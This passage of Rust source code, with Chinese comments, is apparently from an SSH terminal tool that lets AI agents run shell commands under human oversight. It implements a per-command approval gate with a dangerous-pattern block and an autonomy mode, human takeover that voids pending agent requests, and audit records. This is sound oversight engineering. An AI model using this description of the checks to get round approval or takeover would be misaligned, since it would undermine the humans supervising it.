        // cancel（cancel_exec/接管作废）与超时都清窗终止命令——超时谎报已停
        // 是 run_shell 明令禁止的（此处窗口真的被 kill，如实）。
        let poll = format!("test -f {}", sh_single_quote(&rc));
        loop {
            if cancel.is_cancelled() || Instant::now() >= deadline {
                let cleanup = format!(
                    "tmux kill-window -t {} 2>/dev/null; rm -f {} {} {}",
                    sh_single_quote(&format!("{sel}:{TMUX_AGENT_WINDOW}")),
                    sh_single_quote(&out),
                    sh_single_quote(&rc),
                    sh_single_quote(&format!("{rc}.tmp")),
                );
                let _ = crate::SessionManager::tmux_exec(self, &cleanup, 256).await;
                if cancel.is_cancelled() {
                    return Err(Error::Cancelled);
                }
                return Err(Error::ExecTimeout);
            }
            tokio::time::sleep(std::time::Duration::from_millis(400)).await;
            if let Some((_, Some(0))) = crate::SessionManager::tmux_exec(self, &poll, 64).await {
                break;
            }
        }

        // 3) 收割：`RC=<code>\nOUT\n<原样输出>`。cat 后即删——协议头保证输出
        // 任意字节（无尾换行/含分隔串）都不粘连。cap 留协议头余量。
        let reap = format!(
            "printf 'RC='; cat {}; printf '\\nOUT\\n'; cat {}; rm -f {} {}",
            sh_single_quote(&rc),
            sh_single_quote(&out),
            sh_single_quote(&rc),
            sh_single_quote(&out),
        );
        let cap = opts.output_cap.unwrap_or(DEFAULT_OUTPUT_CAP);
        let text = match crate::SessionManager::tmux_exec(self, &reap, cap + 64).await {
            Some((t, _)) => t,
            None => {
                return Err(Error::InvalidInput(
                    "tmux 专窗执行完成但收割失败（通道异常）".into(),
                ))
            }
        };
        let (stdout, exit_code) = split_tmux_exec_out(&text).ok_or_else(|| {
            Error::InvalidInput("tmux 专窗执行收割文本不符合协议（远端异常）".into())
        })?;
        let conv = |s: String| -> (bool, String, bool) {
            let (text, truncated) = truncate_utf8(&s, cap);
            let (has_binary, text) = sanitize_utf8(&text);
            (has_binary, text, truncated)
        };
        let (so_bin, so, so_trunc) = conv(stdout);
        Ok(ExecResult {
            exec_id: exec_id.clone(),
            exit_code: Some(exit_code),
            stdout: so,
            // 2>&1 已合流；stderr 通道恒空（模型侧与 Fresh 合流语义一致）
            stderr: String::new(),
            has_binary: so_bin,
            truncated: so_trunc,
            duration: started.elapsed(),
            approval: trace,
        })
    }

    /// C9（R43）：协作 admission 的会话侧包装——**仅** Agent 受此门（人类是主权者，
    /// 不经协作 gate）。停用/停用中/停用失败一律 `CollabDisabled`。
    fn admit_agent_actor(&self, actor: &Actor) -> Result<()> {
        if actor.is_human() {
            Ok(())
        } else {
            self.center.admit_agent()
        }
    }

    /// exec 管线（SessionApi::exec 的实现体）。
    pub async fn exec(
        self: &Arc<Self>,
        actor: &Actor,
        cmd: &str,
        opts: ExecOpts,
    ) -> Result<ExecResult> {
        // ③ 执行记录：包住全路径（含审批拒绝/超时/危险拦截等早退），失败吞——
        // 记录不得使动作失败。人类动作同样入记录（agent_id=None 侧可辨）。
        let started = Instant::now();
        let mode_dbg = format!("{:?}", opts.mode);
        let r = self.exec_inner(actor, cmd, opts).await;
        let (status, exit_code, output) = match &r {
            Ok(res) => ("ok", res.exit_code, Some(res.stdout.as_str())),
            Err(Error::ApprovalDenied { reason }) => match reason {
                DeniedReason::Denied => ("denied", None, None),
                DeniedReason::ApprovalTimeout => ("timeout", None, None),
                DeniedReason::DangerousPattern => ("dangerous", None, None),
            },
            Err(Error::Cancelled) => ("cancelled", None, None),
            Err(_) => ("error", None, None),
        };
        self.record_action(
            actor,
            tinyssh_records::RecordKind::Exec,
            cmd,
            status,
            exit_code,
            Some(started.elapsed()),
            output,
            serde_json::json!({ "mode": mode_dbg }),
        );
        r
    }

    /// ③ 动作记录（exec/传输/转发共用出口）：输出摘录截断 + 脱敏后入库。
    pub(crate) fn record_action(
        self: &Arc<Self>,
        actor: &Actor,
        kind: tinyssh_records::RecordKind,
        summary: &str,
        status: &str,
        exit_code: Option<i32>,
        duration: Option<Duration>,
        output: Option<&str>,
        meta: serde_json::Value,
    ) {
        let ev = tinyssh_records::RecordEvent {
            seq: 0,
            ts: chrono::Utc::now(),
            kind,
            session_id: Some(self.id.clone()),
            agent_id: match actor {
                Actor::Agent { client_id } => Some(client_id.clone()),
                Actor::Human => None,
            },
            summary: summary.to_string(),
            status: status.to_string(),
            exit_code,
            duration_ms: duration.map(|d| d.as_millis() as u64),
            output_excerpt: output
                .map(|o| tinyssh_records::redact::excerpt(o, tinyssh_records::OUTPUT_EXCERPT_CAP)),
            meta,
        };
        let _ = self.center.records.append(ev);
    }

    async fn exec_inner(
        self: &Arc<Self>,
        actor: &Actor,
        cmd: &str,
        opts: ExecOpts,
    ) -> Result<ExecResult> {
        if cmd.trim().is_empty() {
            return Err(Error::InvalidInput("empty command".into()));
        }
        // tmux 联动二（Agent 分窗）：会话 attach 在 tmux 里时外壳已被 tmux client
        // 取代、OSC 133 不再回流，Shell 模式原本必然 ShellIntegrationUnavailable。
        // 此时不拒绝，改把命令落进 attach 会话的专用窗口（tinyssh-agent）执行：
        // 用户切过去可旁观、当前窗口零污染、断线命令不死（tmux 服务端托管）。
        // 仅 SSH 会话且确已 attach 才分流；未 attach 的世界一行行为不变。
        let tmux_target = if opts.mode == ExecMode::Shell && self.kind == "ssh" {
            self.tmux_attached.lock().unwrap().clone()
        } else {
            None
        };
        // 1) 控制权与重确认检查（人类是主权者，永不被拦；限制只作用于 Agent）
        let reconfirm_verify = {
            let owner = *self.owner.lock().await;
            let state = *self.state.lock().await;
            if owner == ControlOwner::Human && !actor.is_human() {
                return Err(Error::ControlTakenByHuman);
            }
            if state == SessionState::Reconfirming && !actor.is_human() && !is_whitelisted(cmd) {
                return Err(Error::ReconfirmingPending);
            }
            state == SessionState::Reconfirming && is_whitelisted(cmd)
        };

        let exec_id = format!("e-{}", uuid::Uuid::new_v4());
        let cancel = CancellationToken::new();
        self.live_execs
            .lock()
            .unwrap()
            .insert(exec_id.clone(), cancel.clone());

        // 2) 串行队列（背压：超上限立即 QueueBusy）
        let pos = self.queue_waiters.fetch_add(1, Ordering::SeqCst) + 1;
        if pos > MAX_EXEC_QUEUE {
            self.queue_waiters.fetch_sub(1, Ordering::SeqCst);
            self.live_execs.lock().unwrap().remove(&exec_id);
            return Err(Error::QueueBusy {
                position: pos as u32,
            });
        }
        self.pending.lock().unwrap().push(exec_id.clone());
        let gen_at_entry = self.generation.load(Ordering::SeqCst);
        let _slot = self.exec_slot.lock().await;
        self.queue_waiters.fetch_sub(1, Ordering::SeqCst);
        self.pending.lock().unwrap().retain(|e| e != &exec_id);
        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
            self.live_execs.lock().unwrap().remove(&exec_id);
            return Err(Error::VoidedByHandback {
                brief: self.gen_brief().await,
            });
        }
        // C9（R43）：排队等槽期间协作被停用 → 本动作作废（连审批卡都不生成）。
        if let Err(e) = self.admit_agent_actor(actor) {
            self.live_execs.lock().unwrap().remove(&exec_id);
            return Err(e);
        }
        let _cancel_guard = CancelOnDrop(exec_id.clone(), cancel.clone(), &self.live_execs);

        // 3) 审批门（ADR-5：核心层强制；人类短路）
        let started = Instant::now();
        let mut effective_cmd = cmd.to_string();
        let mut edited_cmd: Option<String> = None;
        let trace = match actor {
            Actor::Human => ApprovalTrace {
                approval_id: None,
                outcome: ApprovalOutcome::HumanActor,
            },
            Actor::Agent { client_id } => {
                // 重确认白名单：内置只读核实命令，不进审批（核心自动判定完成）
                if reconfirm_verify {
                    ApprovalTrace {
                        approval_id: None,
                        outcome: ApprovalOutcome::Auto,
                    }
                } else {
                    let eval = self.center.engine.evaluate(client_id, &effective_cmd);
                    match eval.verdict {
                        tinyssh_approval::SegmentVerdict::Dangerous => {
                            self.center.audit.append(
                                actor,
                                "exec_denied",
                                Some(&self.id),
                                Some(&effective_cmd),
                                serde_json::json!({"reason": "dangerous_pattern"}),
                                None,
                            )?;
                            return Err(Error::ApprovalDenied {
                                reason: DeniedReason::DangerousPattern,
                            });
                        }
                        tinyssh_approval::SegmentVerdict::AutoAllow => ApprovalTrace {
                            approval_id: None,
                            outcome: ApprovalOutcome::Auto,
                        },
                        tinyssh_approval::SegmentVerdict::NeedsApproval => {
                            // ② 自主模式：人类按 Agent 显式授权期间跳过逐条审批。
                            // deny 名单已在上面 Dangerous 分支硬拦（先于本分支）；
                            // 传输仍逐条审批；记录/审计照常（本动作 outcome=Autonomous 可辨）。
                            if self.center.autonomy_active(client_id) {
                                ApprovalTrace {
                                    approval_id: None,
                                    outcome: ApprovalOutcome::Autonomous,
                                }
                            } else {
                                let (t, edited) = self
                                    .wait_approval(
                                        actor,
                                        client_id,
                                        &exec_id,
                                        &effective_cmd,
                                        &eval,
                                        true,
                                        opts.mode == ExecMode::Fresh,
                                        tmux_target
                                            .as_deref()
                                            .map(|_| "【tmux：命令将进远端专属窗口（tinyssh-agent）执行，不延续当前终端现场】"),
                                        cancel.clone(),
                                    )
                                    .await?;
                                edited_cmd = edited;
                                t
                            }
                        }
                    }
                }
            }
        };
        if let Some(c) = edited_cmd {
            effective_cmd = c;
        }

        // 4) 开始前再查作废（已批准未开始 → 同样作废）
        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
            return Err(Error::VoidedByHandback {
                brief: self.gen_brief().await,
            });
        }
        // C9（R43）：执行开始前复核协作 admission——停用期间（含排队/审批期间被停用）
        // 的 Agent 动作在此作废，不因排队或旧批准继续执行（§9 line 562-568）。
        self.admit_agent_actor(actor)?;
        if cancel.is_cancelled() {
            return Err(Error::Cancelled);
        }

        // 5) 执行
        let timeout_d = opts.timeout.unwrap_or(DEFAULT_EXEC_TIMEOUT);
        let deadline = Instant::now() + timeout_d;
        let result = match opts.mode {
            ExecMode::Shell => {
                if let Some(sess) = &tmux_target {
                    self.run_tmux_window(
                        &exec_id,
                        &effective_cmd,
                        &opts,
                        deadline,
                        cancel.clone(),
                        trace.clone(),
                        started,
                        sess,
                    )
                    .await
                } else {
                    self.run_shell(
                        actor,
                        &exec_id,
                        &effective_cmd,
                        &opts,
                        deadline,
                        cancel.clone(),
                        trace.clone(),
                        started,
                    )
                    .await
                }
            }
            ExecMode::Fresh => {
                self.run_fresh(
                    actor,
                    &exec_id,
                    &effective_cmd,
                    &opts,
                    deadline,
                    cancel.clone(),
                    trace.clone(),
                    started,
                )
                .await
            }
        };

        // 6) 重确认推进：白名单核实完成 → 退出 Reconfirming（核心自动判定）
        if let Ok(r) = &result {
            let state = *self.state.lock().await;
            if state == SessionState::Reconfirming && is_whitelisted(&effective_cmd) {
                let hits = self.verification_hits.fetch_add(1, Ordering::SeqCst) + 1;
                if hits >= 1 {
                    *self.state.lock().await = SessionState::Connected;
                    self.note_transition("重确认完成：核实事实恢复 Confirmed")
                        .await;
                }
            }
            let _ = r;
        }

        // 7) 审计
        let audit_payload = match &result {
            Ok(r) => serde_json::json!({
                "exit_code": r.exit_code, "duration_ms": r.duration.as_millis() as u64,
                "truncated": r.truncated, "mode": format!("{:?}", opts.mode),
                "autonomous": matches!(trace.outcome, ApprovalOutcome::Autonomous),
            }),
            Err(e) => serde_json::json!({
                "error": e.to_string(),
                "autonomous": matches!(trace.outcome, ApprovalOutcome::Autonomous),
            }),
        };
        let _ = self.center.audit.append(
            actor,
            "exec",
            Some(&self.id),
            Some(&effective_cmd),
            audit_payload,
            trace.approval_id.as_deref(),
        );

        result
    }

    /// 创建并等待审批决策（120s 超时 → ApprovalTimeout；接管 → Voided）。
    /// `editable`：该卡是否支持编辑后批准（exec true；转发/传输 false——
    /// 参数无法从编辑文本回解，T44 复核中-2）。`fresh`：Fresh 模式卡标注
    /// 「不继承当前终端目录/环境」（C3 契约）。`scene_note`：场景注记追加在
    /// 卡面摘要尾部（tmux 联动二的专窗执行同属「不延续现场」，如实标注）。
    pub async fn wait_approval(
        &self,
        actor: &Actor,
        client_id: &AgentClientId,
        _exec_id: &ExecId,
        cmd: &str,
        eval: &tinyssh_approval::Evaluation,
        editable: bool,
        fresh: bool,
        scene_note: Option<&str>,
        cancel: CancellationToken,
    ) -> Result<(ApprovalTrace, Option<String>)> {
        let mut summary = target_summary(cmd);
        if fresh {
            summary.push_str("【Fresh：不继承当前终端目录/环境】");
        }
        if let Some(note) = scene_note {
            summary.push_str(note);
        }
        let item = ApprovalItem {
            id: format!("a-{}", uuid::Uuid::new_v4()),
            session_id: self.id.clone(),
            agent_id: client_id.clone(),
            command: cmd.to_string(),
            edited_command: None,
            target_summary: summary,
            segment_report: eval.segments.clone(),
            session_busy: self.screen.lock().await.blocks.has_open_block(),
            editable,
            created_at: chrono::Utc::now(),
            status: ApprovalStatus::Pending,
            attempt_id: None,
            // R42（§6.7）：请求发起时的「可用目的」快照（读取路径会再按当前目标投影刷新）。
            purpose: self.goal.lock().unwrap().clone(),
        };
        let gen_at_entry = self.generation.load(Ordering::SeqCst);
        let (tx, rx) = oneshot::channel();
        {
            let mut decisions = self.center.decisions.lock().unwrap();
            decisions.insert(item.id.clone(), tx);
        }
        {
            let mut items = self.center.items.lock().unwrap();
            items.insert(item.id.clone(), item.clone());
            evict_approval_items(&mut items, APPROVAL_ITEMS_CAP);
        }
        if let Err(e) = self.center.vault.save_approval(&item) {
            tracing::warn!("save approval: {e}");
        }
        let _ = self
            .center
            .approvals_tx
            .send(ApprovalEvent::New(item.clone()));
        let _ = self.center.audit.append(
            actor,
            "approval_requested",
            Some(&self.id),
            Some(cmd),
            serde_json::json!({"segments": eval.segments}),
            Some(&item.id),
        );

        // 卡片登记与代际捕获之间发生接管 → 登记后复查一次，即时作废返回
        // （否则该请求会空等到 120s 超时而非立即 VoidedByHandback）
        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
            self.mark_status(&item.id, ApprovalStatus::Voided);
            self.forget_decision(&item.id);
            let voided_item = self.center.items.lock().unwrap().get(&item.id).cloned();
            if let Some(mut it) = voided_item {
                it.status = ApprovalStatus::Voided;
                let _ = self.center.vault.save_approval(&it);
                let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
            }
            return Err(Error::VoidedByHandback {
                brief: self.gen_brief().await,
            });
        }
        let decision: DecisionMsg = tokio::select! {
            r = rx => match r {
                Ok(msg) => msg,
                Err(_) => return Err(Error::Storage("decision channel dropped".into())),
            },
            _ = tokio::time::sleep(DEFAULT_APPROVAL_TIMEOUT) => {
                self.mark_status(&item.id, ApprovalStatus::Timeout);
                self.forget_decision(&item.id);
                return Err(Error::ApprovalDenied { reason: DeniedReason::ApprovalTimeout });
            }
            _ = cancel.cancelled() => {
                // 取消（cancel_exec）与 timeout/接管同责收尾（审计 R4）：不置 Voided
                // 则卡片永久 Pending、decisions 的 oneshot 滞留，人类后续决定报
                // "receiver dropped" 且卡仍是 Pending
                self.mark_status(&item.id, ApprovalStatus::Voided);
                self.forget_decision(&item.id);
                let voided_item = self.center.items.lock().unwrap().get(&item.id).cloned();
                if let Some(mut it) = voided_item {
                    it.status = ApprovalStatus::Voided;
                    let _ = self.center.vault.save_approval(&it);
                    let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
                }
                return Err(Error::Cancelled);
            }
            // 接管发生 → 本请求作废（含待审批卡片）
            _ = async {
                loop {
                    if self.generation.load(Ordering::SeqCst) != gen_at_entry { break; }
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
            } => {
                self.mark_status(&item.id, ApprovalStatus::Voided);
                self.forget_decision(&item.id);
                let voided_item = self.center.items.lock().unwrap().get(&item.id).cloned();
                if let Some(mut it) = voided_item {
                    it.status = ApprovalStatus::Voided;
                    let _ = self.center.vault.save_approval(&it);
                    let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
                }
                return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
            }
        };

        // C9（R43）：批准（**含编辑后批准**）后、执行前复核 admission——停用期间
        // 已批准未执行的请求作废（不因旧审批决定继续执行）。两臂对称：只挡直接
        // 批准会漏掉「保存并批准」（ApproveEdited）这条 UI 可达路径。
        if matches!(
            decision,
            DecisionMsg::Decide(Decision::Approve)
                | DecisionMsg::Decide(Decision::ApproveEdited(_))
        ) {
            if let Err(e) = self.center.admit_agent() {
                self.mark_status(&item.id, ApprovalStatus::Voided);
                self.forget_decision(&item.id);
                let snap = self.center.items.lock().unwrap().get(&item.id).cloned();
                if let Some(mut it) = snap {
                    it.status = ApprovalStatus::Voided;
                    let _ = self.center.vault.save_approval(&it);
                    let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
                }
                return Err(e);
            }
        }
        match decision {
            DecisionMsg::Decide(Decision::Approve) => {
                self.mark_status(&item.id, ApprovalStatus::Approved);
                Ok((
                    ApprovalTrace {
                        approval_id: Some(item.id),
                        outcome: ApprovalOutcome::Approved,
                    },
                    None,
                ))
            }
            DecisionMsg::Decide(Decision::ApproveEdited(c)) => {
                if !self.center.engine.is_editable_decision(client_id, &c) {
                    self.mark_status(&item.id, ApprovalStatus::Denied);
                    return Err(Error::ApprovalDenied {
                        reason: DeniedReason::DangerousPattern,
                    });
                }
                self.mark_edited(&item.id, &c);
                Ok((
                    ApprovalTrace {
                        approval_id: Some(item.id),
                        outcome: ApprovalOutcome::ApprovedEdited,
                    },
                    Some(c),
                ))
            }
            DecisionMsg::Decide(Decision::Deny) => {
                self.mark_status(&item.id, ApprovalStatus::Denied);
                let _ = self.center.audit.append(
                    actor,
                    "approval_denied",
                    Some(&self.id),
                    Some(cmd),
                    serde_json::json!({}),
                    Some(&item.id),
                );
                Err(Error::ApprovalDenied {
                    reason: DeniedReason::Denied,
                })
            }
            DecisionMsg::Voided => {
                self.mark_status(&item.id, ApprovalStatus::Voided);
                return Err(Error::VoidedByHandback {
                    brief: self.gen_brief().await,
                });
            }
        }
    }

    fn mark_status(&self, id: &str, status: ApprovalStatus) {
        let mut items = self.center.items.lock().unwrap();
        if let Some(it) = items.get_mut(id) {
            it.status = status;
        }
        // 注意：这里**不动 decisions**。外部作废方（takeover/close_session）与本
        // future 的 select 多臂存在竞态——若在此摘除 oneshot 且不发送，rx 臂同时
        // 变 ready（Err(Canceled)），随机选中即把本应 VoidedByHandback 的路径污染
        // 成 Storage 错。oneshot 的清理归 wait_approval 自己的出口（forget_decision）
        // 与显式 send(Voided) 的收口方（close_session）。
    }

    /// wait_approval 出口自清：摘除本卡仍挂着的 oneshot Sender（仅超时/取消/
    /// 接管返回等 waiter 自己退出时调用；无人再需要它，留着即泄漏）。
    fn forget_decision(&self, id: &str) {
        self.center.decisions.lock().unwrap().remove(id);
    }

    fn mark_edited(&self, id: &str, edited: &str) {
        let mut items = self.center.items.lock().unwrap();
        if let Some(it) = items.get_mut(id) {
            it.status = ApprovalStatus::ApprovedEdited;
            it.edited_command = Some(edited.to_string());
        }
    }

    /// 尽力停止：SIGINT→SIGQUIT 升级（Shell）；通道取消（Fresh）。逐条真实结果。
    async fn stop_one(&self, exec_id: &ExecId, running: &RunningExec) -> (ExecId, StopOutcome) {
        match running.mode {
            ExecMode::Shell => {
                let _ = self.channel.signal(TransportSignal::Interrupt).await;
                if self.wait_exec_exit(exec_id, Duration::from_secs(2)).await {
                    let code = self
                        .screen
                        .lock()
                        .await
                        .blocks
                        .last_blocks(1)
                        .last()
                        .and_then(|b| b.exit_code)
                        .unwrap_or(0);
                    return (exec_id.clone(), StopOutcome::Exited(code));
                }
                let _ = self.channel.signal(TransportSignal::Quit).await;
                if self.wait_exec_exit(exec_id, Duration::from_secs(2)).await {
                    return (exec_id.clone(), StopOutcome::Escalated);
                }
                (exec_id.clone(), StopOutcome::Unresponsive)
            }
            ExecMode::Fresh => {
                running.cancel.cancel();
                (exec_id.clone(), StopOutcome::Escalated)
            }
        }
    }

    async fn wait_exec_exit(&self, exec_id: &str, wait: Duration) -> bool {
        let deadline = Instant::now() + wait;
        loop {
            if !self.running.lock().unwrap().contains_key(exec_id) {
                return true; // 已从 running 移除 = 已退出
            }
            if Instant::now() >= deadline {
                return false;
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    }

    /// 接管契约（PRD FR-6 v0.5）。
    pub async fn takeover(self: &Arc<Self>, opts: ControlOpts) -> Result<TakeoverReport> {
        let mut owner = self.owner.lock().await;
        if *owner == ControlOwner::Human {
            drop(owner);
            // 幂等：重复接管直接返回当前状态
            return Ok(TakeoverReport {
                frozen: true,
                paused_queue: Vec::new(),
                stopped: Vec::new(),
                brief: *self.gen_brief().await,
            });
        }
        // 1) 冻结：控制权原子切换 + 代际 +1（所有交接前未开始请求作废）
        *owner = ControlOwner::Human;
        drop(owner);
        self.generation.fetch_add(1, Ordering::SeqCst);
        self.note_transition("人类接管（交接前未开始的请求全部作废）")
            .await;

        // 2) 作废待审批卡片（不可再生效）
        let voided_ids: Vec<ApprovalId> = {
            let items = self.center.items.lock().unwrap();
            items
                .iter()
                .filter(|(_, it)| it.session_id == self.id && it.status == ApprovalStatus::Pending)
                .map(|(id, _)| id.clone())
                .collect()
        };
        for id in &voided_ids {
            self.mark_status(id, ApprovalStatus::Voided);
            let it = self.center.items.lock().unwrap().get(id).cloned();
            if let Some(mut it) = it {
                it.status = ApprovalStatus::Voided;
                let _ = self.center.vault.save_approval(&it);
                // 作废留痕（五人走查·老周，与 close_session 同口径）：接管作废的卡
                // 也要能事后核对「作废了什么」。takeover 仅人类可入（set_control
                // 前置校验），此处 actor 固定 Human。
                let _ = self.center.audit.append(
                    &Actor::Human,
                    "approval_voided",
                    Some(&self.id),
                    Some(&it.command),
                    serde_json::json!({"reason": "takeover", "agent": it.agent_id}),
                    Some(id),
                );
                let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
            }
        }

        // 3) 排队（未开始）exec 作废并列出
        let paused_queue: Vec<ExecId> = std::mem::take(&mut *self.pending.lock().unwrap());
        for id in &paused_queue {
            if let Some(c) = self.live_execs.lock().unwrap().get(id) {
                c.cancel();
            }
        }
        // 4) 排队传输作废
        {
            let mut transfers = self.transfers.lock().unwrap();
            for (_, t) in transfers.iter_mut() {
                t.cancel();
            }
        }
        // 5) send_keys 会话级授权失效（expires: 接管）
        self.send_keys_auth.lock().unwrap().clear();

        // 6) 尽力停止运行中任务（显式选项）
        let mut stopped = Vec::new();
        if opts.stop_running == StopPolicy::BestEffort {
            let running: Vec<(ExecId, RunningExec)> = self
                .running
                .lock()
                .unwrap()
                .iter()
                .map(|(k, v)| {
                    (
                        k.clone(),
                        RunningExec {
                            mode: v.mode,
                            cancel: v.cancel.clone(),
                            started: v.started,
                        },
                    )
                })
                .collect();
            for (id, r) in &running {
                let outcome = self.stop_one(id, r).await;
                stopped.push(outcome);
            }
        }

        let brief = self.gen_brief().await;
        let _ = self.center.audit.append(
            &Actor::Human,
            "takeover",
            Some(&self.id),
            None,
            serde_json::json!({"voided_approvals": voided_ids, "paused_queue": paused_queue, "stopped": stopped.iter().map(|(e, o)| (e, format!("{o:?}"))).collect::<Vec<_>>()}),
            None,
        );
        Ok(TakeoverReport {
            frozen: true,
            paused_queue,
            stopped,
            brief: *brief,
        })
    }

    /// 交还契约：恢复 Agent 控制权；旧请求不自动执行（已在接管时作废）。
    pub async fn handback(self: &Arc<Self>) -> Result<TakeoverReport> {
        {
            let mut owner = self.owner.lock().await;
            if *owner == ControlOwner::Agent {
                return Err(Error::InvalidInput("control already owned by agent".into()));
            }
            *owner = ControlOwner::Agent;
        }
        // R42（§6.7）：控制权一旦到过 Agent，此后 Human-owned 的入口措辞即「交还 Agent」。
        self.ever_agent_owned.store(true, Ordering::SeqCst);
        self.note_transition("人类交还（Agent 先读简报，再重新决定动作）")
            .await;
        let brief = self.gen_brief().await;
        let _ = self.center.audit.append(
            &Actor::Human,
            "handback",
            Some(&self.id),
            None,
            serde_json::json!({}),
            None,
        );
        Ok(TakeoverReport {
            frozen: false,
            paused_queue: Vec::new(),
            stopped: Vec::new(),
            brief: *brief,
        })
    }

    /// 断线 → 尽力重连（不含注入；注入由 pump 在"先订阅"之后调用 reinject_integration）。
    /// R26（§6.4）：全程发射 session-state 事件（Degraded → Reconnecting{attempt≤3}
    /// → Reconfirming | Disconnected）；retry_stop 置位后下一检查点（≤250ms）停止重试。
    pub async fn on_transport_reconnect(self: &Arc<Self>) {
        {
            let mut st = self.state.lock().await;
            if *st == SessionState::Closed {
                return;
            }
            *st = SessionState::Degraded;
        }
        self.retry_stop.store(false, Ordering::SeqCst);
        self.note_transition("连接退化，尝试重连").await;
        self.emit_state(SessionState::Degraded, None, None, None)
            .await;
        let mut attempt = 0;
        loop {
            attempt += 1;
            if attempt > 3 {
                *self.state.lock().await = SessionState::Disconnected;
                self.note_transition("重连失败（Disconnected）").await;
                self.emit_state(
                    SessionState::Disconnected,
                    None,
                    None,
                    Some("自动重连 3 次均失败".into()),
                )
                .await;
                return;
            }
            if self.retry_stop.load(Ordering::SeqCst) {
                *self.state.lock().await = SessionState::Disconnected;
                self.note_transition("用户停止自动重连（Disconnected）")
                    .await;
                self.emit_state(
                    SessionState::Disconnected,
                    None,
                    None,
                    Some("已停止自动重连".into()),
                )
                .await;
                return;
            }
            *self.state.lock().await = SessionState::Reconnecting;
            self.emit_state(
                SessionState::Reconnecting,
                Some(attempt as u32),
                Some(3),
                None,
            )
            .await;
            match self.channel.reconnect().await {
                Ok(()) => {
                    // 重连成功 ≠ 现场延续：cwd/env 事实降级；新 shell 需重新注入集成
                    self.reset_scene_after_reconnect().await;
                    return;
                }
                Err(e) => {
                    tracing::warn!(session = %self.id, attempt, "reconnect failed: {e}");
                    // 分片睡眠：停止重试的等待延迟 ≤250ms（整段 2s sleep 会吞停止请求）
                    for _ in 0..8 {
                        if self.retry_stop.load(Ordering::SeqCst) {
                            break;
                        }
                        tokio::time::sleep(Duration::from_millis(250)).await;
                    }
                }
            }
        }
    }

    /// R26：会话状态事件广播（尽力发送；无订阅者时静默——UI 兜底 3s 列表轮询）。
    pub async fn emit_state(
        &self,
        state: SessionState,
        attempt: Option<u32>,
        max_attempts: Option<u32>,
        detail: Option<String>,
    ) {
        let _ = self.center.state_tx.send(SessionStateEvent {
            session_id: self.id.clone(),
            state,
            attempt,
            max_attempts,
            detail,
        });
    }

    /// 重连成功后的现场重置：残留 open block 强制收尾（旧 shell 已死，永不闭合——
    /// 不收尾则后续 shell exec 全部等块空闲超时）；集成标记计数重置（旧连接的
    /// saw_133 粘滞会让重注入就绪等待立即放行、run_shell 误判可用，§6-17）；
    /// cwd 事实降级（新 shell 不延续现场）。
    pub async fn reset_scene_after_reconnect(&self) {
        let mut s = self.screen.lock().await;
        s.reset_integration_tracking();
        // Screen 层收尾：强制闭合打开块 + 落账未回填的块输出采集窗（尾窗滞留的
        // 输出不随窗作废）
        s.force_close_open(chrono::Utc::now());
        s.invalidate_cwd();
    }

    /// C3（R24）三注入点收敛：按 host_setting 注入集成片段。返回是否注入
    /// （host_setting=false → Disabled 不注入不等 OSC——DC3/P3；B12 重连同口径）。
    /// V2：注入文本前置探针行（同批执行在钩子安装前，不产生命令块），并派
    /// 旁路判型任务——fish 登录主机补写 fish 片段（bash/zsh/sh 族零额外动作）。
    pub async fn inject_integration(self: &Arc<Self>) -> bool {
        if self.host.shell_integration != Some(true) || self.kind != "ssh" {
            *self.integration.lock().unwrap() = session_api::IntegrationState::Disabled;
            return false;
        }
        // 重连重探：复位上一轮的阻断判定（远端默认 shell 可能已更换）
        self.remote_shell_blocked.store(false, Ordering::Relaxed);
        // 先订阅再写：探针输出不得落入无订阅者窗口（与泵同款纪律）
        let probe_rx = self.channel.subscribe_output();
        let snippet = format!(
            "{}\n{}\n",
            crate::SSH_SHELL_PROBE,
            crate::ssh_integration_snippet()
        );
        let mut text = snippet;
        text.push('\n');
        {
            let mut s = self.screen.lock().await;
            s.register_outgoing(text.as_bytes(), term_core::BlockSource::Human);
        }
        let _ = self
            .channel
            .write(&crate::charset::encode(self.host.charset, &text))
            .await;
        *self.integration.lock().unwrap() = session_api::IntegrationState::Pending;
        self.spawn_shell_family_probe(probe_rx);
        true
    }

    /// V2 旁路判型：监听注入批次输出，探针标记判出 Fish 才补写 fish 片段。
    /// 判型失败/超时/sh 族 → 静默退出（sh 片段已就位，行为与 V1 完全一致）。
    /// 用户刚敲过键（<2s）则放弃补写：避免补写文本插进用户正在输入的命令行。
    fn spawn_shell_family_probe(self: &Arc<Self>, mut rx: broadcast::Receiver<Vec<u8>>) {
        let h = self.clone();
        let jh = tokio::spawn(async move {
            let mut buf: Vec<u8> = Vec::new();
            // 窗口 10s 与重连路径同源：冷容器/高负载下首个提示符实测 3s 不够，
            // 3s 时慢登录 fish 主机判型永远落空、且此后每次 run_shell 罚等 10s
            // （找茬轮 F3 对齐重连注释的实测数据）。
            let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
            let mut windows_blocked = false;
            loop {
                tokio::select! {
                    chunk = rx.recv() => match chunk {
                        Ok(b) => {
                            buf.extend_from_slice(&b);
                            if buf.len() > 64 * 1024 {
                                buf.drain(..buf.len() - 64 * 1024);
                            }
                            let text = String::from_utf8_lossy(&buf);
                            if crate::windows_probe_error(&text) {
                                windows_blocked = true;
                                break;
                            }
                            if crate::classify_shell_probe(&text)
                                != crate::RemoteShellFamily::Sh
                            {
                                break;
                            }
                        }
                        Err(broadcast::error::RecvError::Lagged(_)) => continue,
                        Err(_) => return, // 通道关闭：会话退场，不补写
                    },
                    _ = tokio::time::sleep_until(deadline) => break,
                }
            }
            if windows_blocked {
                // 找茬轮 F1：cmd/PowerShell 没有 printf，注入批次（探针行+片段+
                // 尾清屏）只会逐行报错且永不清除。发 cls 自愈清屏并置阻断旗标，
                // run_shell 从此立即如实拒绝（host_setting 如实为 true：是平台
                // 没有可注入的 POSIX shell，不是用户没开开关）。
                h.mark_remote_shell_blocked().await;
                return;
            }
            if crate::classify_shell_probe(&String::from_utf8_lossy(&buf))
                != crate::RemoteShellFamily::Fish
            {
